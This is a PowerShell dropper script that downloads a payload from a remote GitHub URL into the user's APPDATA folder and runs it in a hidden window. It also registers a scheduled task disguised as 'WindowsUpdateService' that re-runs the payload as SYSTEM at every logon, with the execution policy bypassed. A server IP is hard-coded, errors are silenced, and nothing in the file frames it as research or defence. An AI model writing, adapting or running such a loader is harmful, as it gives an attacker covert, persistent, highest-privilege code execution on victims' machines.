# bootstrap.ps1 - Persistent installer with offline capability
$ErrorActionPreference = 'SilentlyContinue'

# Configuration (UPDATE THIS WITH YOUR ARCH IP)
$serverIP = "147.185.221.31"
$localPayloadPath = "$env:APPDATA\Microsoft\Windows\batch.ps1"
$payloadUrl = "https://raw.githubusercontent.com/JoshBeCute/letssee/main/batch.ps1"

# 1. Download main payload if missing or forced update
$isUpdate = $args -contains "-update"
if (-not (Test-Path $localPayloadPath) -or $isUpdate) {
    try {
        (New-Object Net.WebClient).DownloadFile($payloadUrl, $localPayloadPath)
        Write-Host "✓ Payload updated successfully" -ForegroundColor Green
    }
    catch {
        if (-not (Test-Path $localPayloadPath)) {
            Write-Host "❌ Failed to download payload. Using local copy if available..." -ForegroundColor Red
            exit
        }
    }
}

# 2. Create persistence (scheduled task)
$taskName = "WindowsUpdateService"
if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$localPayloadPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
    Write-Host "✓ Persistence established (runs on startup)" -ForegroundColor Green
}

# 3. Run payload immediately if not already running
if (-not (Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $localPayloadPath })) {
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$localPayloadPath`"" -WindowStyle Hidden
    Write-Host "✓ Payload started successfully" -ForegroundColor Green
}
else {
    Write-Host "✓ Payload already running" -ForegroundColor Yellow
}
